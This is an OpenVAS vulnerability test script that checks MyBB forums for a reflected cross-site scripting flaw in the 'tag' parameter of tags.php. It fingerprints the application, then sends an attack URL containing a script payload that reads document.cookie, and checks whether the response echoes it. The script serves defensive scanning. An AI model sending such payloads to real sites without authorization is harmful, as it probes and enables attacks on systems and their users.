###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_mybb_tag_param_xss_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# MyBB 'tags.php' Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to insert arbitrary HTML
  and script code, which will be executed in a user's browser session in the
  context of an affected site.
  Impact Level: Application";
tag_affected = "MyBB versions 1.6.5 and prior.";
tag_insight = "The flaw is due to improper validation of user-supplied input
  via the 'tag' parameter in 'tags.php', which allows attackers to execute
  arbitrary HTML and script code in a user's browser session in the context
  of an affected site.";
tag_solution = "No solution or patch is available as of 27th December, 2011. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://www.mybb.com/downloads";
tag_summary = "The host is running MyBB and is prone to cross site scripting
  vulnerability.";

if(description)
{
  script_id(902804);
  script_version("$Revision: 13 $");
  script_bugtraq_id(45388);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-12-27 15:15:15 +0530 (Tue, 27 Dec 2011)");
  script_name("MyBB 'tags.php' Cross Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check if MyBB is vulnerable to Cross-Site Scripting");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/45388");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/64148");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/108156/mybb165-xss.txt");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/96658/mybbtag-xss.txt");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)) {
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("/forum", "/mybb", cgi_dirs()))
{
  ## Send and Receive the response
  req = http_get(item: dir + "/index.php",  port:port);
  res = http_keepalive_send_recv(port:port, data:req);

  ## Confirm the application before trying exploit
  if(">MyBB" >< res && ">MyBB Group<" >< res)
  {
    ## Construct attack request
    url = dir + '/tags.php?tag="><script>alert(document.cookie)</script>';

    ## Try XSS and check the response to confirm vulnerability
    if(http_vuln_check(port:port, url:url, check_header: TRUE,
                       pattern:"><script>alert\(document.cookie\)</script>"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
